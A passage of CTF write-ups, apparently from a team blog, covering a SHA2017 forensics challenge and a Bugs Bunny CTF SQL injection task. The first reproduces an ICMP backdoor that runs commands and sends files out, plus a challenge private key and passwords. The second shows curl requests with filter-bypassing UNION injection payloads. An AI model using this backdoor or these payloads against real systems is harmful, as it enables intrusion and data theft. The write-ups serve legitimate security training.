443&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;command:tcpdump -Dcommand:1.ens33 [Up, Running]2.ens39 [Up, Running]3.any (Pseudo-device that captures on all interfaces) [Up, Running]4.lo [Up, Running, Loopback]5.nflog (Linux netfilter log (NFLOG) interface)6.nfqueue (Linux netfilter queue (NFQUEUE) interface)7.usbmon1 (USB bus number 1)8.usbmon2 (USB bus number 2)command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!Usefull data extracted: command:cat /root/certs/intranet.crtcommand:—–BEGIN CERTIFICATE—–MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==—–END CERTIFICATE—–command:cat /root/certs/intranet.keycommand:—–BEGIN PRIVATE KEY—–MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=—–END PRIVATE KEY—–command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script: 123456789infile1=\"encrypted2\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin)): outp = n.decrypt(strin[i]) print outp 123456789kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pygetfile:/tmp/intranet.pcapgetfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRUgetfile:3:8XB7Q94TDBClV8w4qhq69z3FZYrv8t2WgEKqgXrWdlHdlAFX8ALVsMhCJIBkRaym0tYdVp1SG4MaZR4Tss3uWqkUHUP2IHv2mxW9kJtXQcCFacZu6BB6WbVWAABCAAAAQgAAAAAMKUT6VQAMKT39sAgARQAANPb5QABABsB2wKgBAsCoAQEBu8YiHIz10SeSnX2AEADzDMEAAAEBCAoAJQRCAWpAmegQelnOVgAAjQAAAI0AAAAADCk9_bAADClE-lUIAEUAAH_bZ0AAQAbbvcCoAQHAqAECxiIBuyeSnX0cjPXRgBgA8YPFAAABAQgKAWpAowAlBEIUAwMAAQEWAwMAQGxEpdaDTXP8knA4zCtiwo73wxpiSMwEg4mUp0JHTM5EVi8fDHmJwxa4h0XRCtUMYW1ku3J8B2mDM4-Be7yzVgXoEHpZwVcAAEIAAABCAAAAAAwpRPpVAAwpPf2wCABFAAA09vpAAEAGwHXAqAECwKgBAQG7xiIcjPXRJ5KdyIAQAPMMbAAAAQEICgAlBEIBakCj6BB6WWhYAABcAQAAXAEAAAAMKUT6VQAMKT39sAgARQABTvb7QABABr9awKgBAsCoAQEBu8YiHIz10SeSnciAGADzZFwAAAEBCAoAJQRCAWpAoxYDAwDKBAAAxgAAASwAwAgdhAXn_d9KSZnZsG-gE9lS8acf1BQiUuNF04t4gevS8ICJtSUIJdGsE-qc2tSvQnLimi0T1iSzd47KHZC4nPZt8UmAPz8CvuPkoG2nSNnhtH7aG3vuLtigzX4okzcPOGpRgetfile:15:TcpH8DKbQqyDTZP90vOPC7ZroVI7FBLP3tehUVdCsB5kcVOtOgwoeNuBDLMQwHANdbwLTIcc8rWzDtchd96wrcnYimMMVXom7hJFk9CYIvLi1AjgVnUmgijI_ZAvr768ZkMUK9zVD1CWi7x1yw-7a3r9XPaQAx4C_VXxF42RQ7lofpm0NeTW_RQddZVBmc7JRGHSyhhgvnPK9AvSftJCCR2w4U7ivYo3uXfyVBjkj2OnMPWtUeqWQxEMSVPnTp8pQ7CHG0ZhHzowGnNued80Q9s3cR5Dkb2EeAVtwoWObjMziRAuwahOsO88dbD0mOFbJMPNCQst5qOv0KkgXc4ArGuRdj3DqLdqZboIsRIFwk1BKxHoaBedqa8F8GR2t1RZ-xR31I5RSnJrJSn-v2ktPLitzNW5K46Ors604DI6pwH3GKv1moTI-Bc_S54n1WATXNYWBcE5T8_BxHPB6ezfXuuJK-Epgfu5UDMwkRCS84b0R5GT4gYdWLqOvIF0bJrLI1OgDT-ODRNIt_Ehq3jnXlV0gIwLr0nWLzGjDh4dhGdvNC1kylYtkzta6L-eBcnkDjKhyWMZa2pL6NN5iF2RaoKswfm_ZmBEygpY0s8VlBFf0Ut7s6D1vyUNiNEGwR8LZ13L4rxE4Cz51rFPeKFO80yWeYtXEyCz7idxVoT9cp_U8ospLrMcmalnXvZL4OGPzwT7G_dpZoZ6tMYRBKwgSn1KuyvmGlY9VGyQk16PqgpAk09-tmwlYJeEhPQGlrx-JpW6agdmeibUwsMZ0-oYJBhD0cvVwyOtgetfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1getfile:165:cHurdwdnjePy6Xa5SBJU_Mbe1VPdwEuXvCW1XXCaId6Y09yNKbwX0W3KPWiTJ_ZgDoSKci1FZs9sK9gFobVoTOMBicG6atQrQ5TuoL-Er2T8HDGkhComD0AfHzgxHQRy5LbcUsRpMvLLJfsv0ULnwmfjcmk6RWT1IChIG7gUxie3xVnh9lFiOZlVFxFz_NB1JPlWpTqV-8c_tFM9tSk4ud7u4lMdjPgKPO-5eknyZiT8g5WbwDqteDdSuRAfYTl0A0EoEBqNr3wiRTxJJlhGVCWX70ki5CDNCNKMlK9YifFey6W2DMv4_5m616CWgLUNJTeowqqHWA2INCeLrn-dHZi-ADsKHNYoxEqIrJlpZCiUM5L-rOC_TtQ6COT7Aro7kaH1qdQkwgygg2qP6_Xe5mFO4IOMFkcx-51kDyjtfHUGBx2veXXEDfAScnKY9GY_905jJafZ9J8vRfeszHiD0quOv0edGw8NbKp3_pk2nL2Ey-vCIcm4lR0WXOFuOmwj67o6mk_cq2n7axOkJ8gcEc61AqJ7LzZbJFr0_b3bnaZzkXuKF_IokNRQJDpD1WfLkI_ba8Q3u2d8nui9ljBWs7VzwAl8dR1iH4QtIIturGVQEIR8jA3mn1evUTQvFjA-BN2nlOmXqyjoXU0HcaOC53Vj2d1r_J_64CmdAnlWJ-2aeG3dCoP0fYYxvKKpI1g6WXCX_Li701DtBTl6Hnp6ICHW7GEqxK96H0BfB_Sb6UQFa_9ScfbNd3ohC9xxYiiGSssqHiHkiAJ0vfYXSZYMs9YeTpSA273k...Truncated... We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see “getfile:/tmp/intranet.pcap” so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it’s actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!).Our final python script will be: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i])infile2=\"encrypted2\"with open(infile2) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for lin in strin: outp = n.decrypt(lin) numb = re.findall(r\"getfile:([0-9]+).*\", outp) outp = re.findall(r\"getfile:[0-9]+:(.*)\", outp) if numb != []: if dicio.has_key(numb[0]): dicio[numb[0]].append(outp[0]) else: dicio[numb[0]]=[outp[0]]for j in range(0,4): final=\"\" for i in range(0,301): try: final += base64.urlsafe_b64decode(dicio[str(i)][j]) except IndexError: break file = open('lol%d.pcap'%j,'wb+') file.write(final) Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:Edit -&gt; Preferences -&gt; protocols -&gt; SSL 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol1.pcap intranet.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark intranet.pcap Now seeing HTTP packages we can see that the hacker downloaded file secret.zip! The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was “somehow” complicated) or we needed to find it in our USB capture! which is a USB keyboard capture! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol4.pcap usb.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark usb.pcap Extract the keys pressed from the usb.cap: 12kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r usb.pcap -Y \"frame.len==72\" -Tfields -e usb.capdata &gt; usb.txt And now getting the table to decode the keys from http://www.usb.org/developers/hidpage/Hut1_12v2.pdf Writting the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778shift = \"02:00:00:00:00:00:00:00\"ignore = \"00:00:00:00:00:00:00:00\"ignore2 = \"01:00:00:00:00:00:00:00\"keys_dict = &#123;'04': 'a', '05': 'b', '06': 'c', '07': 'd', '08': 'e', '09': 'f', '0a': 'g', '0b': 'h', '0c': 'i', '0d': 'j', '0e': 'k', '0f': 'l', '10': 'm', '11': 'n', '12': 'o', '13': 'p', '14': 'q', '15': 'r', '16': 's', '17': 't', '18': 'u', '19': 'v', '1a': 'w', '1b': 'x', '1c': 'y', '1d': 'z', '1e': '1', '1f': '2', '20': '3', '21': '4', '22': '5', '23': '6', '24': '7', '25': '8', '26': '9', '27': '0', '28': '\\r\\n', '29': '', '2a': '', '2b': '', '2c': ' ', '2d': '-', '2e': '=', '2f': '[', '30': ']', '31': '\\\\', '32': '#', '33': ':', '34': \"'\", '35': '', '36': ',', '37': '.', '38': '/'&#125;with open('usb.txt', 'r') as f: keys_lines = f.readlines() s = \"\" for key in keys_lines: if key.strip() == shift or key.strip() == ignore or key.strip() == ignore2: continue k=key.split(\":\") #print key == ignore, key == '02:00:00:00:00:00:00:00', key if k[0] == '02': #shift pressed if keys_dict[k[2]] == '2': s += '@' else: s += keys_dict[k[2]].upper() else: s += keys_dict[k[2]] print s 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; python usb.pyrootWelcome123ls -lacurl -ks https://root:Welcome123@intranet/secret.zipunzip secret.zipPyj4m4P4rtY@2017cat secret.txtdisplay hamburglogoout The password is Pyj4m4P4rtY@2017 for the zip file! 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; unzip secret.zip Archive: secret.zip[secret.zip] secret.txt password: inflating: secret.txt inflating: hamburger_pussy.jpgkinyabitch@Debian ~/D/H/c/sha2017&gt; cat secret.txt Important passwords:secret.zip Pyj4m4P4rtY@2017root Welcome123flag flag&#123;bf107b7f64f320034df7e48669439f69&#125; Finally the flag was flag{bf107b7f64f320034df7e48669439f69}","categories":[{"name":"Network","slug":"Network","permalink":"https://teamrocketist.github.io/categories/Network/"}],"tags":[{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"},{"name":"network","slug":"network","permalink":"https://teamrocketist.github.io/tags/network/"}]},{"title":"[Web] Bugs Bunny CTF - LQI_X 140","slug":"Web-Bugs-Bunny-CTF-LQI-X-140","date":"2017-08-02T10:29:58.000Z","updated":"2017-08-10T02:57:43.109Z","comments":true,"path":"2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","link":"","permalink":"https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","excerpt":"","text":"LQI_X140Its for your , login and get all you needtask : http://34.253.165.46/LQI_X/Author: TnMch We have login form so lets start by doing some tests with curl at the GET parameter username: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -L \"http://34.253.165.46/LQI_X/?username=test'&amp;password=\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test'&amp;password= HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:27:30 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 749&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Nothing seems to be Changing lets try with password: 12345678910111213141516171819curl -L \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'%20or%201=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'%20or%201=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:32:28 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Content-Length: 12&lt; Content-Type: text/html; charset=UTF-8&lt; * Curl_http_done: called premature == 0* Connection #0 to host 34.253.165.46 left intactNo way SOrry Wow a custom error message? they must be filtering some characters or even words… Maybe its the spaces, lets try to use the comment technique to bypass space filtering: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/or/**/1=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/or/**/1=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:37:24 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 753&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It works! now lets use order by to see how many values are returned to know how many columns we will use on our union query injection. Using CURL with I option to check the status code from the request so if the query returns an error we will get a 500 (Internal Error) if not we get a 200 (OK) 12345678910111213(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/1--\"HTTP/1.1 200 OKDate: Wed, 02 Aug 2017 10:43:01 GMTServer: Apache/2.4.18 (Ubuntu)Content-Type: text/html; charset=UTF-8(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/2--\"HTTP/1.0 500 Internal Server ErrorDate: Wed, 02 Aug 2017 10:43:03 GMTServer: Apache/2.4.18 (Ubuntu)Connection: closeContent-Type: text/html; charset=UTF-8 As we can see the sql query is only selecting one column the real query must be something similar to this “Select username from table_users where username=%s and password=%s”. Now injecting with union: 123456789101112131415161718192021222324252627282930313233343536373839 curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/1--\"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It worked! as you can see at the image above the number “1” showed up now what I tryed after this was getting the table names from information_schema but somehow I wasn’t able to do it so I tried to guess the obvious names, assumed that the table name is users and the columns probably id,username and password. 123456789101112131415161718192021222324252627282930313233343536373839404142curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/0,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 2&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1--\"* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 3&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 5&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;... As we can see we were successful to leak the ids from the users now lets try with the password 12345678910111213141516171819202122232425262728293031(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/0,1--\".... &lt;div class=\"login-help\"&gt; 